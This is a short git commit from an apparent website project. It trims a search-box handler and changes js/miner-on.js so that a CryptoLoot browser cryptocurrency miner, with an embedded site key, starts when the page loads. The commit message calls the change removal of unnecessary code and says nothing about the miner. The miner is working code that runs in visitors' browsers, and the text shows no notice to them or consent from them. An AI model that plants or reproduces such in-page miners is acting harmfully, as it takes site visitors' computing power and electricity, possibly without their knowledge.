8db964b3806e02898735120321c13f5fc43e4980
Guli <ignaciomorenopubul@gmail.com>
2017-11-06 00:16:37 +0100

    Remove unncecessary code

--- js/app.js
+++ js/app.js
@@ -2,8 +2,5 @@ window.__gcse = {
   callback: function () {
     $('.fa.fa-search.fa-2x').removeClass('hidden')
     $('#gsc-i-id1').attr('placeholder', 'Search the web')
-    $('.gsc-search-box.gsc-search-box-tools').submit(function () {
-      console.log('DONE')
-    })
   }
 }
--- js/miner-on.js
+++ js/miner-on.js
@@ -1,4 +1,4 @@
-$('document').ready(function () {
+$(window).on('load', function () {
   var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
     autoThreads: false,
     throttle: 0.7
